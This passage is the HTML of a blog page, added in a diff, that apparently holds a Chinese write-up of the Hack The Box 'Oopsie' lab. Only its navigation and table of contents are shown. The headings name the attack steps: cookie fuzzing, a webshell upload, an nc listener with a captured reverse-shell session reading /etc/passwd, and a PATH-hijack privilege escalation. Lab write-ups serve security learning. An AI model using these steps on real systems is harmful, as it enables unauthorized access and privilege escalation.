@@ -1,0 +1,3103 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../Medium/VariaType/">
+      
+      
+        <link rel="next" href="../../../PortSwigger-Academy/File%20upload%20vulnerabilities/">
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Oopsie - DarkLord-W's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="DarkLord-W&#39;s Blog" class="md-header__button md-logo" aria-label="DarkLord-W's Blog" data-md-component="logo">
+      
+  <img src="https://avatars.githubusercontent.com/u/42199147" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            DarkLord-W's Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Oopsie
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="DarkLord-W&#39;s Blog" class="md-nav__button md-logo" aria-label="DarkLord-W's Blog" data-md-component="logo">
+      
+  <img src="https://avatars.githubusercontent.com/u/42199147" alt="logo">
+
+    </a>
+    DarkLord-W's Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BUUCTF
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    BUUCTF
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BUUCTF/Web/HCTF%202018WarmUp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HCTF 2018WarmUp
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basic
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Basic
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BUUCTF/basic/AWD-Test1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AWD Test1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BUUCTF/basic/BUU%20BRUTE%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BUU BRUTE 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BUUCTF/basic/BUU%20BURP%20COURSE%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BUU BURP COURSE 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BUUCTF/basic/BUU%20CODE%20REVIEW%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BUU CODE REVIEW 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BUUCTF/basic/BUU%20LFI%20COURSE%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BUU LFI COURSE 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BUUCTF/basic/BUU%20SQL%20COURSE%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BUU SQL COURSE 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BUUCTF/basic/BUU%20SQL%20COURSE%202/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BUU SQL COURSE 2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BUUCTF/basic/BUU%20UPLOAD%20COURSE%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BUU UPLOAD COURSE 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BUUCTF/basic/BUU%20XXE%20COURSE%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BUU XXE COURSE 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTB
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HTB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Medium
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Medium
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Medium/VariaType/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    VariaType
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Starting Point
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Starting Point
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Oopsie
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Oopsie
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        扫描端口
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        访问web目录
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="访问web目录">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#login" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        查看源码，搜索login关键字得到：
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        访问得到登陆界面
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#login-as-guestaccount" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        尝试爆破密码未成功，点击[Login as Guest],进入后台，并点击Account
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookiefuzz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        拦截流量并对cookie中的参数进行fuzz
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#34322-admin-2233-guest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        测试出34322 / admin 以及 2233 / guest这两个账户
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fuzzadmin-cookieuploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        用fuzz得到的admin cookie去访问Uploads页面
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcookie34322-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        然后上传冰蝎shell（上传时也需要注意修改cookie为34322 / admin）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellfuzz" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        上传成功，但是不知道shell所在目录，所以需要fuzz出目录
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        连接shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ncshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        本地开启nc监听，获取稳定shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellshellbinbash-script-q-devnull" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        切换为交互式shell：SHELL=/bin/bash script -q /dev/null
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kalikali-nc-vnlp-5678-listening-on-any-5678-connect-to-10101490-from-unknown-1012928222-47640-linux-oopsie-4150-76-generic-86-ubuntu-smp-fri-jan-17-172428-utc-2020-x86_64-x86_64-x86_64-gnulinux-084631-up-123-0-users-load-average-000-000-000-user-tty-from-login-idle-jcpu-pcpu-what-uid33www-data-gid33www-data-groups33www-data-binsh-0-cant-access-tty-job-control-turned-off-pwd-whoami-www-data-ls-bin-boot-cdrom-dev-etc-home-initrdimg-initrdimgold-lib-lib64-lostfound-media-mnt-opt-proc-root-run-sbin-snap-srv-sys-tmp-usr-var-vmlinuz-vmlinuzold-shellbinbash-script-q-devnull-www-dataoopsie-whoami-whoami-www-data-www-dataoopsievarwwwhtml-cat-etcpasswd-cat-etcpasswd-rootx00rootrootbinbash-daemonx11daemonusrsbinusrsbinnologin-binx22binbinusrsbinnologin-sysx33sysdevusrsbinnologin-syncx465534syncbinbinsync-gamesx560gamesusrgamesusrsbinnologin-manx612manvarcachemanusrsbinnologin-lpx77lpvarspoollpdusrsbinnologin-mailx88mailvarmailusrsbinnologin-newsx99newsvarspoolnewsusrsbinnologin-uucpx1010uucpvarspooluucpusrsbinnologin-proxyx1313proxybinusrsbinnologin-www-datax3333www-datavarwwwusrsbinnologin-backupx3434backupvarbackupsusrsbinnologin-listx3838mailing-list-managervarlistusrsbinnologin-ircx3939ircdvarrunircdusrsbinnologin-gnatsx4141gnats-bug-reporting-system-adminvarlibgnatsusrsbinnologin-nobodyx6553465534nobodynonexistentusrsbinnologin-systemd-networkx100102systemd-network-managementrunsystemdnetifusrsbinnologin-systemd-resolvex101103systemd-resolverrunsystemdresolveusrsbinnologin-syslogx102106homesyslogusrsbinnologin-messagebusx103107nonexistentusrsbinnologin-_aptx10465534nonexistentusrsbinnologin-lxdx10565534varliblxdbinfalse-uuiddx106110runuuiddusrsbinnologin-dnsmasqx10765534dnsmasqvarlibmiscusrsbinnologin-landscapex108112varliblandscapeusrsbinnologin-pollinatex1091varcachepollinatebinfalse-sshdx11065534runsshdusrsbinnologin-robertx10001000roberthomerobertbinbash-mysqlx111114mysql-servernonexistentbinfalse-www-dataoopsievarwwwhtml" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ┌──(kali㉿kali)-[~] └─$ nc -vnlp 5678 listening on [any] 5678 ... connect to [10.10.14.90] from (UNKNOWN) [10.129.28.222] 47640 Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 08:46:31 up 1:23, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can&#39;t access tty; job control turned off $ pwd / $ whoami www-data $ ls bin boot cdrom dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var vmlinuz vmlinuz.old $ SHELL=/bin/bash script -q /dev/null www-data@oopsie:/$ whoami whoami www-data www-data@oopsie:/var/www/html$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin robert:x:1000:1000:robert:/home/robert:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false www-data@oopsie:/var/www/html$
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        提权
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="提权">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#webdbphp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        进入web目录下，查看db.php，获取到数据库连接信息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#robert" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        登陆robert账户，并查看相关权限
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#robertbugtrackerbugtracker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        发现robert用户属于bugtracker组，查找bugtracker
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tmpcat-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        进入/tmp目录（因为可写），然后创建名为cat的文件（实际内容是启动一个 Shell），内容如下：
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tmpcat-path-export-pathtmppath-cat-tmp-bin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        赋予/tmp/cat执行权限，然后劫持 PATH 环境变量：export PATH=/tmp:$PATH(告诉系统：当有人运行 cat 时，先去 /tmp 找，而不是去系统的 /bin 找)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#usrbinbugtracker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        然后再次执行/usr/bin/bugtracker触发提权
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
